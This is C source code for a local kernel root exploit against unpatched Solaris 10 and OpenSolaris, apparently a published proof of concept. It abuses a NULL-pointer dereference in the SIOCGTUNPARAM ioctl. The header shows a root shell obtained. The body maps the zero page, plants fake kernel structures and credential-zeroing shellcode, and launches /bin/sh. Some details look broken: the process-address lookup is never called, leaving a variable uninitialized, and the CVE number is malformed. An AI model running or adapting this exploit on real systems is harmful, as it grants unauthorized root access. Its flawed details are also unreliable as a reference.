/***********************************************************
 * hoagie_solaris_siocgtunparam.c
 * LOCAL SOLARIS KERNEL ROOT EXPLOIT (< 5.10 138888-01) - CVE-2008-568
 *
 * Bug reported by Tobias Klein
 * http://www.trapkit.de/advisories/TKADV2008-015.txt
 * Exploit by: peri.carding (http://www.void.at/main/)
 * 
 * $ ./hoagie_solaris_siocgtunparam
 * hoagie_solaris_siocgtunparam.c - solaris root < < 5.10 138888-01 local
 * -andi / void.at
 *
 * [*] socket created
 * [*] mapping zero page successful
 * [*] process cred address: 0xd3853894
 * [*] prepare null page
 * [*] clean up write queue
 * # uname -a
 * SunOS unknown 5.10 Generic_118844-26 i86pc i386 i86pc
 * # id
 * uid=0(root) gid=0(root)
 * #
 *
 * First of all we have to make sure that ip_extract_tunreq() will
 * return 0 and ipifp is still set to NULL. This can be achieved by
 * using an interface alias starting with zero. (the interface ip.tun0
 * must not exist because ipif_lookup_on_name() will "fail" to get
 * null page)
 *
 * ip_if.c / ipif_lookup_on_name()
 * ...
 *    if (&cp[2] < endp && cp[1] == '0')
 *       return (NULL);
 * ...
 * 
 * In ip_sioctl_tunparam() ipif->ipif_ill is used for mutex enter
 * so we have to set the offet for an ill_t structure. Later putnext()
 * will be called with a queue (see ill_t). We can use this queue to
 * add a custom callback function that is used by putnext().
 * 
 * ip_if.c / ip_sioctl_tunparam(): 
 * ...
 *      ill = ipif->ipif_ill;
 *      mutex_enter(&connp->conn_lock);
 *      mutex_enter(&ill->ill_lock);
 * ...
 *      if (success) {
 *         ip1dbg(("sending down tunparam request "));
 *         putnext(ill->ill_wq, mp1);
 *         return (EINPROGRESS);
 * ...
 *
 * putnext.c / putnext():
 * ...
 *      mutex_exit(QLOCK(qp));
 *      STR_FTEVENT_MSG(mp, fqp, FTEV_PUTNEXT, mp->b_rptr -
 *         mp->b_datap->db_base);
 *      (*putproc)(qp, mp);
 * ...
 *
 * ill_wq can't be modified from kernel space because its allocated
 * in userland -> so we cannot modify the ill_wq queue in kernel
 * code. thereforce a signal handler will clean the queue in userland.
 *
 * Affected Software:      Solaris 10 without patch 138888-01 (SPARC)
 *                         Solaris 10 without patch 138889-01 (x86)
 *                         OpenSolaris < snv_77 (SPARC)
 *                         OpenSolaris < snv_77 (x86) 
 *
 * THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
 * CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
 * DAMAGE DONE USING THIS PROGRAM.
 *
 * VOID.AT Security
 * andi@void.at
 * http://www.void.at
 *
 ************************************************************/
#define _STRUCTURED_PROC 1

#include <sys/socket.h>
#include <sys/sockio.h>
#include <sys/mman.h>
#include <net/if.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/procfs.h>

int *nullpage;

void clean_up_wq() {
   fprintf(stderr, "[*] clean up write queue\n");
   *(nullpage + 0x208 / 4) = 0x000; 
}

int get_proc_address() {
   int fd;
   char filename[512];
   psinfo_t psinfo;

   snprintf(filename, sizeof(filename), "/proc/%d/psinfo", getpid());
   fd = open(filename, O_RDONLY);
   if (fd == -1) {
      return -1;
   }

   memset(&psinfo, 0, sizeof(psinfo_t));
   if (read(fd, &psinfo, sizeof(psinfo_t)) != sizeof(psinfo_t)) {
      close(fd);
      return -1;
   }

   close(fd);

   return psinfo.pr_addr;
}

/**
 * \xff\xff\xff\xff will be replaced by target process credential address
 * (can be any process). set cr_uid, cr_gid, cr_ruid and cr_rguid to 0.
 */
char shellcode[] = 
   "\x50"
   "\xb8\xff\xff\xff\xff"
   "\x8b\x00"
   "\xc7\x40\x10\x00\x00\x00\x00"
   "\xc7\x40\x0c\x00\x00\x00\x00"
   "\xc7\x40\x08\x00\x00\x00\x00"
   "\xc7\x40\x04\x00\x00\x00\x00"
   "\x58"
   "\xc3";

int main(int argc, char **argv) { 
   int s;
   struct iftun_req req;
   int cred_addr;

   fprintf(stderr,
           "hoagie_solaris_siocgtunparam.c - solaris root < < 5.10 138888-01 local\n"
	              "-andi / void.at\n\n");

   s = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
   if (s == -1) {
      fprintf(stderr, "[-] can't create socket\n");
      return -1;     
   } else {
      fprintf(stderr, "[*] socket created\n");
   }

   memset(&req, 0, sizeof(req));
   strcpy(req.ifta_lifr_name, "ip.tun0:012");

   nullpage = (int*)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANON, -1, 0);
   if (nullpage == MAP_FAILED) {
      fprintf(stderr, "[-] can't mmap null page\n");
      return -2;
   } else {
      fprintf(stderr, "[*] mapping zero page successful\n");
   }

   if (cred_addr == -1) {
      fprintf(stderr, "[-] can't get process address\n");
      return -3;
   } else {
      cred_addr += 0x5 * sizeof(int *);
      fprintf(stderr, "[*] process cred address: 0x%08x\n", cred_addr);
      memcpy(shellcode + 2, &cred_addr, 4);
   }

   fprintf(stderr, "[*] prepare null page\n");
   memset(nullpage, 0, 0x1000);
   /* offset   0x0 = ipif_t */
   /* offset   0x4 = ipif_ll */
   *(nullpage + 0x004 / 4) = 0x200;
   /* offset 0x200 = ill_t */
   /* offset 0x008 = ill_wq */
   *(nullpage + 0x208 / 4) = 0x400; 
   /* offset 0x400 = queue_t */
   /* offset 0x00c = q_next */
   *(nullpage + 0x40c / 4) = 0x600;
   /* offset 0x600 = queue_t (second) */
   /* offset 0x000 = qinfo */
   *(nullpage + 0x600 / 4) = 0x800;
   /* offset 0x800 = qinfo */
   /* offset 0x000 = qi_putp */
   *(nullpage + 0x800 / 4) = 0x900;
   memcpy((char*)nullpage + 0x900, shellcode, sizeof(shellcode));

   /* install signla handler to clean up write queue */
   signal(SIGALRM, clean_up_wq);
   alarm(1);

   /* launch attack */
   ioctl(s, SIOCGTUNPARAM, &req);

   /* start root shell - not really required because p_cred is shared
    * but we want the nice # prompt ;-) */
   system("/bin/sh");

   return 0;
}
